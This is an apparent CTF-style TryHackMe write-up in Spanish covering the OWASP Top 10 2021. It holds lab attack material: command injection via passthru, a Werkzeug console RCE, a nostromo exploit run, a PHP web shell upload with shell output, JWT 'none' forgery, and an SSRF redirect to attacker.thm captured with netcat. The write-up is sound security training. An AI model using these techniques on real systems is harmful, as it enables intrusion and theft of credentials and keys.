---
title: "TryHackMe: OWASP Top 10 - 2021"
date: 2025-07-07
category: "TryHackMe"
order: 7
tags: ["tryhackme", "owasp-top-10"]
layout: layouts/writeup.njk
permalink: /writeups/thm-owasp-top-10-2021.html
---

## 1. Broken Access Control

Hay sitios web que tienen páginas privadas visibles de alguna forma — por ejemplo, un portal admin accesible por un bug a cualquier usuario. Eso significa que los controles no están bien, es decir, **broken access control**. Permite:

- Ver información sensible.
- Acceso a funciones no autorizadas.

Un ejemplo real: alguien encontró una vulnerabilidad en YouTube que permitía ver frames de videos marcados como privados.

### IDOR Challenge (Insecure Direct Object Reference)

También conocido como IDOR, es un fallo de control de acceso que permite ver recursos que no deberían ser visibles. Ocurre cuando el programador expone un **Direct Object Reference** — el id de un objeto en el servidor (usuario, cuenta bancaria, archivo, etc.).

Si el sitio está mal configurado, cambiar el parámetro `id` en la URL retorna la información de otro objeto distinto al propio.

**Flag encontrada en las notas de otros usuarios:** `flag{fivefourthree}`

---

## 2. Cryptographic Failures

Surge del mal uso o falta de uso de algoritmos criptográficos para proteger información sensible. Ejemplo: una aplicación de correo segura necesita **encrypting data in transit** (la conexión cliente-servidor encriptada) y **encrypting data at rest** (los correos encriptados en el servidor, para que ni el proveedor pueda leerlos). Fallos criptográficos suelen llevar a divulgación de información sensible, y en niveles más complejos a ataques man-in-the-middle.

### Bases de datos flat-file

En producción es común ver bases de datos en servidores dedicados (MySQL, MariaDB), pero también existen bases de datos "flat-file" almacenadas en un solo archivo — más simples de configurar, usadas en apps pequeñas.

### Crackeo de hashes

Para hashes MD5 de contraseñas débiles, [CrackStation](https://crackstation.net/) funciona bien usando una wordlist masiva — si la contraseña no está en la lista, no puede romper el hash.

### Práctica

Se encontró en el código fuente una ruta de imágenes; navegando el árbol de directorios hacia arriba se llegó a `assets/` donde había un archivo de base de datos SQLite:

```bash
sqlite> .tables
sessions  users
sqlite> select * from users;
4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
```

El hash del admin era MD5 y correspondía a la contraseña `qwertyuiop`.

**Flag tras loguear como admin:** `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`

---

## 3. Injection

Los flujos de inyección son comunes porque la app interpreta la entrada del usuario como comandos o parámetros. Ejemplos:

- **SQL Injection:** el usuario controla el input que se introduce a una consulta SQL, permitiendo manipular o robar información de la base de datos.
- **Command Injection:** el usuario logra que su input se ejecute como comando del sistema operativo.

Prevención principal: asegurarse de que la entrada del usuario no sea interpretada como consultas o comandos — con **allow lists** (comparar contra una lista segura) o **stripping input** (remover caracteres peligrosos antes de procesar).

### 3.1 Command Injection

Ocurre cuando el código server-side de una webapp llama a una función que interactúa con la consola del sistema, permitiendo ejecutar comandos arbitrarios.

**Ejemplo de código vulnerable** (una app que genera ASCII art de vacas con `cowsay`):

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];

        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```

Las variables `$mooing` y `$cow` se pasan directo a `passthru()` sin sanitizar.

### Explotación con inline commands de Bash

Bash permite ejecutar comandos dentro de comandos con la sintaxis `$(comando)`. La consola ejecuta primero el comando interno y usa el resultado como parámetro del comando externo. Enviando un inline command como input del formulario cowsay, se logra ejecución arbitraria. Comandos útiles para reconocimiento:

```bash
whoami
id
ifconfig / ip addr
uname -a
ps -ef
```

Con esto se identificó la versión de Alpine Linux corriendo (**3.16.0**) y el usuario bajo el que corre la app.

---

## 4. Insecure Design

Se refiere a vulnerabilidades inherentes al diseño de la aplicación — no son fallos de implementación o configuración, la app está mal diseñada desde el inicio. Suele pasar cuando el modelado de amenazas fue insuficiente durante la planeación, o cuando un desarrollador deja código de testing (como una función OTP deshabilitada) que nunca se reactiva en producción.

### Insecure Password Resets

Un caso real ocurrió en Instagram: al resetear contraseña se enviaba un código de 6 dígitos, y aunque IG bloqueaba los intentos después de 250, el límite se aplicaba **por IP** — un atacante que rotara IPs podía seguir intentando indefinidamente.

### Práctica

El mecanismo de reset de contraseña usaba 3 preguntas de "seguridad" (nombre, color favorito, dirección de la mascota). La más fácil de adivinar era el color favorito — con un password spray de colores comunes se encontró la respuesta correcta.

**Flag:** `THM{Not_3ven_c4tz_c0uld_sav3_U!}`

---

## 5. Security Misconfiguration

Pasa cuando se cree que las medidas de seguridad están bien configuradas, pero no es así. Incluye:

- Buckets de Amazon S3 mal configurados.
- Servicios innecesarios habilitados.
- Cuentas con credenciales por defecto.
- Divulgación de información a través de mensajes de error.
- Falta de encabezados de seguridad HTTP.

### Debugging Interfaces

Es común dejar funciones de debugging expuestas en producción — útiles durante el desarrollo, pero explotables si no se deshabilitan antes de publicar. Un ejemplo real: Patreon tenía una consola de ejecución de código Python expuesta, lo que llevó a ejecución remota de código y su hackeo.

### Práctica

Se explotó una **consola Werkzeug** expuesta para ejecutar Python arbitrario:

```python
import os; print(os.popen("ls -l").read())
```

Esto reveló un archivo `todo.db` en el directorio actual, y leyendo el código fuente de `app.py` se encontró la variable `secret_flag`.

**Flag:** `THM{Just_a_tiny_misconfiguration}`

---

## 6. Vulnerable and Outdated Components

Usar software obsoleto o desactualizado es devastador para la seguridad de una empresa.

### Explotación

Se identificó el servicio `nostromo 1.9.6` corriendo, con un exploit público conocido (CVE-2019-16278) disponible en Exploit-DB:

```bash
python2 47837.py 127.0.0.1 80 id
...
HTTP/1.1 200 OK
Server: nostromo 1.9.6

uid=1001(_nostromo) gid=1001(_nostromo) groups=1001(_nostromo)
```

### Lab

Usando un exploit público (subida de web shell PHP) contra la aplicación vulnerable:

```bash
python exploit.py http://10.10.62.51:84
> Attempting to upload PHP web shell...
> Web shell uploaded to http://10.10.62.51:84/bootstrap/img/i8UduN0TeD.php
> Do you wish to launch a shell here? (y/n): y
RCE $ whoami
apache
RCE $ cat /opt/flag.txt
THM{But_1ts_n0t_my_f4ult!}
```

---

## 7. Identification and Authentication Failures

La autenticación es un tema crítico: cuando alguien envía credenciales correctas, el servidor emite una cookie de sesión. Si un atacante encuentra una falla en el mecanismo de autenticación, puede ganar acceso a cuentas de usuarios. Fallas comunes:

- **Ataques de fuerza bruta:** sitios que permiten múltiples intentos de login sin límite.
- **Credenciales débiles:** políticas de contraseña insuficientes.
- **Cookies de sesión débiles:** valores predecibles que un atacante puede reproducir.

**Mitigaciones:** política de contraseñas, bloqueo tras múltiples intentos fallidos, y autenticación multi-factor.

### Práctica: registro de usuario duplicado

Fallo lógico común: registrar un nuevo usuario literalmente llamado `" admin"` (con un espacio) puede terminar con los mismos permisos que el usuario `admin` real, dependiendo de cómo la app compare nombres de usuario.

**Flags encontradas:**
- Cuenta de darren: `fe86079416a21a3c99937fea8874b667`
- Cuenta de arthur: `d9ac0f7db4fda460ac3edeb75d75e16e`

---

## 8. Software and Data Integrity Failures

**Integridad** es la certeza de que algo sigue siendo original y no fue modificado. Los hashes se usan para verificar que un archivo no cambió en tránsito o en reposo.

### 8.1 Software Integrity Failures

Cuando se carga una librería externa como jQuery directo desde un CDN:

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
```

Si un atacante logra inyectar código malicioso en esa librería, cualquier sitio que la cargue queda comprometido. La defensa es **Subresource Integrity (SRI)**, que verifica el hash del recurso antes de ejecutarlo:

```html
<script src="https://code.jquery.com/jquery-3.6.1.min.js" integrity="sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=" crossorigin="anonymous"></script>
```

Hash SHA-256 de `jquery-1.12.4.min.js`: `sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=`

### 8.2 Data Integrity Failures — JWT y el algoritmo "none"

Las cookies de sesión mantienen el estado de login. Una mala implementación (guardar el username directo en una cookie sin protección) permite que el usuario la edite y se haga pasar por otra persona — un fallo de integridad, porque la app confía en información que el atacante pudo alterar.

**JSON Web Tokens (JWT)** resuelven esto: tienen 3 partes (header, payload, signature) codificadas en Base64. La signature valida que el payload no fue alterado, usando una secret key que solo el servidor conoce.

**La vulnerabilidad "none algorithm":** algunas librerías JWT antiguas permiten bypassear la validación de firma si se:

1. Cambia el `alg` del header a `none`.
2. Se elimina la parte de la firma (dejando el punto final).

```
Header modificado:  {"typ":"JWT","alg":"none"}
Payload modificado: {"username":"admin","exp":...}

Token final: <header_b64>.<payload_b64>.
```

Con esta técnica se cambió el campo `username` de `guest` a `admin` en el JWT de la cookie `jwt-session`, sin firma, y el servidor lo aceptó igual.

**Flag:** `THM{Dont_take_cookies_from_strangers}`

---

## 9. Security Logging and Monitoring Failures

Cada acción de un usuario debería monitorearse. Sin monitoreo, no hay forma de determinar qué hizo un atacante tras comprometer una cuenta. Impactos de no tener logging:

- **Daño regulatorio:** si un atacante accede a PII sin dejar rastro, los usuarios finales son los afectados y la empresa queda sujeta a sanciones regulatorias.
- **Riesgo de ataques futuros:** sin detección, un atacante puede seguir presente y lanzar más ataques.

Información típica a loguear: HTTP status codes, timestamps, usernames, endpoints/rutas, direcciones IP.

### Práctica: detectar fuerza bruta en logs

```
200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login
...
401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login
401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login
401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login
401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login
```

**IP del atacante:** `49.99.13.16` — **Tipo de ataque:** Brute Force (múltiples usernames probados desde la misma IP en rápida sucesión).

---

## 10. Server-Side Request Forgery (SSRF)

Ocurre cuando un atacante logra que una aplicación web envíe peticiones en su nombre hacia destinos arbitrarios, controlando el contenido de la petición. Surge típicamente cuando la app necesita consumir servicios de terceros.

**Ejemplo:** una app envía SMS a través de una API externa, exponiendo un parámetro `server` que define el host del proveedor:

```
https://www.mysite.com/sms?server=attacker.thm&msg=ABC
```

Si el atacante cambia `server` a una máquina propia, la app reenvía la solicitud (incluyendo la API key secreta) al atacante en vez de al proveedor real. Capturando con Netcat:

```bash
nc -lvp 80
Listening on 0.0.0.0 80
Connection received on 10.10.1.236 43830
GET /:8087/public-docs/123.pdf HTTP/1.1
Host: 10.10.10.11
```

SSRF puede escalar a:

- Enumerar redes internas (IPs y puertos).
- Abusar de relaciones de confianza entre servidores para acceder a servicios restringidos.
- Interactuar con servicios no-HTTP para lograr ejecución remota de código.

### Práctica

El único host permitido para acceder al área admin era `localhost`. El botón "Download Resume" tenía un parámetro `server` apuntando a `secure-file-storage.com`. Cambiándolo a la IP propia con un listener activo:

```
http://10.10.136.131:8087/download?server=10.13.51.230:80&id=75482342
```

**Flag:** `THM{Hello_Im_just_an_API_key}`
